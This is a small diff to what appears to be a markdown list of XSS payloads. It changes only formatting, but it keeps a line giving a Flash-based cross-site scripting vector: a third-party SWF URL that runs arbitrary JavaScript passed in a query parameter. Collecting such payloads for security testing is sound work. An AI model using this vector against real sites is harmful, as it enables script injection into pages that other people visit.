@@ -1,8 +1,5 @@
 
-
-
-
-[XSS]
+# [XSS]
 
 Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
 
